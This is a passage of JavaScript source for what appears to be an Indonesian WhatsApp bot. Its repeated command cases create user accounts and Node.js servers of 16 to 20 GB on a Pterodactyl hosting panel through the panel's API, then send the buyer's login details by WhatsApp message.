let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "16gb": case 'panel16gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "16250"
let cpu = "900"
let disk = "16250"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "17gb": case 'panel17gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "172050"
let cpu = "900"
let disk = "17250"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "18gb": case 'panel18gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "18250"
let cpu = "900"
let disk = "18250"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${pushname}`)
}
break
case "19gb": case 'panel19gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "19250"
let cpu = "900"
let disk = "19250"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛\n
Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang ${pushname}`)
}
break
case "20gb": case 'panel20gb': {
if (!isPremium && !isCreator) return m.reply(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "20350"
let cpu = "1000"
let disk = "20350"
let email = username + "@inzie.host"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${pushname}_`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*NOTES :*
*⎘ DATA HANYA 1× KIRIM*
*⎘ JAGA BAIK BAIK DATA*
*⎘ GAR? BAWA BUKTI TF*
*⎘ NO MAKSA REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "./Rezz.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GRUP ETMIN","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 PENCET=SALIN USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 PENCET=SALIN PASSWORD",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
newsletterName: "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
